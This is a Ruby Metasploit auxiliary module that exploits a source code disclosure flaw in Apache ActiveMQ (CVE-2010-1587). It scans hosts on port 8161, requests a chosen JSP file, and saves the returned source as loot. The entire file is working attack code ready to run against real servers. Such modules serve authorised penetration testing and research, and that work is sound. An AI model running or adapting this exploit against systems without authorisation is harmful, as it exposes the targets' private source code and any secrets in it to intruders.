##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache ActiveMQ JSP files Source Disclosure',
      'Description'    => %q{
          This module exploits a source code disclosure in Apache ActiveMQ. The
        vulnerability is due to the Jetty's ResourceHandler handling of specially crafted
        URI's starting with //. It has been tested successfully on Apache ActiveMQ 5.3.1
        over Windows 2003 SP2 and Ubuntu 10.04.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Veerendra G.G', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2010-1587' ],
          [ 'OSVDB', '64020' ],
          [ 'BID', '39636' ],
          [ 'URL', 'https://issues.apache.org/jira/browse/AMQ-2700' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(8161),
        OptString.new('TARGETURI', [true, 'Path to the JSP file to disclose source code', '/admin/index.jsp'])
      ], self.class)
  end

  def run_host(ip)

    print_status("#{rhost}:#{rport} - Sending request...")
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      'uri'          => uri,
      'method'       => 'GET',
    })

    if res and res.code == 200
      contents = res.body
      fname = File.basename(datastore['TARGETURI'])
      path = store_loot(
        'apache.activemq',
        'text/plain',
        ip,
        contents,
        fname
      )
      print_status("#{rhost}:#{rport} - File saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to retrieve file")
      return
    end
  end
end
